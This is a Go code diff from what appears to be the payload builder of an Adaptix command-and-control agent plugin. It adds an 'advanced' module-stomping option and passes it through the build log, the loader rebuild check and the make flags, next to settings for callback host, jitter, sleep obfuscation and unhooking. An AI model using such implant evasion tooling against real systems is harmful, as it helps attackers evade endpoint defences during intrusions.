@@ -178,6 +178,11 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		moduleStomp = v
 	}
 
+	stompAdvanced := false
+	if v, ok := agentCfg["stomp_advanced"].(string); ok {
+		stompAdvanced = strings.ToLower(v) != "basic (loadlibraryex)"
+	}
+
 	stompDll := "chakra.dll"
 	if v, ok := agentCfg["stomp_dll"].(string); ok && v != "" {
 		stompDll = v
@@ -295,7 +300,11 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		buildLog(1, "transport=HTTP  callback=%s:%d  sleep=%dms  jitter=%d%%", callbackHost, callbackPort, sleepMs, jitterPct)
 	}
 	buildLog(1, "debug=%v  full_rebuild=%v", debug, fullRebuild)
-	buildLog(1, "module_stomp=%v  stomp_dll=%s  stomp_unwind=%v  thread_pool=%v", moduleStomp, stompDll, stompUnwind, useThreadPool)
+	stompTechLabel := "basic"
+	if stompAdvanced {
+		stompTechLabel = "advanced"
+	}
+	buildLog(1, "module_stomp=%v  technique=%s  stomp_dll=%s  stomp_unwind=%v  thread_pool=%v", moduleStomp, stompTechLabel, stompDll, stompUnwind, useThreadPool)
 	buildLog(1, "bof_stomp=%v  bof_sync_dll=%s  bof_async_pool=%v  sm_stomp_dll=%s", bofStomp, bofStompDll, bofStompPool, smStompDll)
 	buildLog(1, "unhook_dll_notify=%v", unhookDllNotify)
 	sleepObfName := map[string]string{"0": "disabled", "1": "enabled"}[sleepObf]
@@ -428,6 +437,10 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 	if !moduleStomp {
 		stompMode = "0"
 	}
+	stompAdv := "0"
+	if stompAdvanced && moduleStomp {
+		stompAdv = "1"
+	}
 	execMode := "1"
 	if !useThreadPool {
 		execMode = "0"
@@ -438,7 +451,7 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 	// Transport profile is NOT included — the loader doesn't use it.
 	loaderObjDir := filepath.Join(naxRoot, "src_loader", "bin", "obj")
 	sentinel := filepath.Join(loaderObjDir, ".nax_defines")
-	currentDefines := stompMode + ":" + execMode
+	currentDefines := stompMode + ":" + execMode + ":" + stompAdv
 	if prev, err := os.ReadFile(sentinel); err != nil || strings.TrimSpace(string(prev)) != currentDefines {
 		buildLog(1, "Loader defines changed - rebuilding")
 		os.RemoveAll(loaderObjDir)
@@ -449,6 +462,7 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 	makeArgs := []string{"-C", naxRoot, target,
 		"NAX_STOMP_MODE=" + stompMode,
 		"NAX_EXEC_MODE=" + execMode,
+		"NAX_STOMP_ADVANCED=" + stompAdv,
 		"NAX_TRANSPORT_PROFILE=" + strconv.Itoa(transportProfile),
 	}
 	buildLog(1, "Compiling: make %s", strings.Join(makeArgs[1:], " "))
